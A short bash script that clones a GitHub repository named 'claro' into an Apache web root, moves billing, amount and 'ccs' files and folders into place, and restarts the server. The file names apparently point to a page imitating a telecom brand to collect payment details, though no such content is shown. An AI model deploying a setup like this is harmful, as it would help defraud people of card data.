#!/bin/bash
cd /etc/apache2/sites-available; nano 000-default.conf
cd /var/www; git clone https://github.com/resekk-vps/claro
cd /var/www/claro; nano config.php
cd /var/www/direct; mv ccs /var/www; mv data /var/www; mv estilos /var/www; mv imagenes /var/www; mv billing.php /var/www; mv config.php /var/www; mv error.php /var/www; mv index.html /var/www; mv monto.php /var/www
sudo service apache2 restart
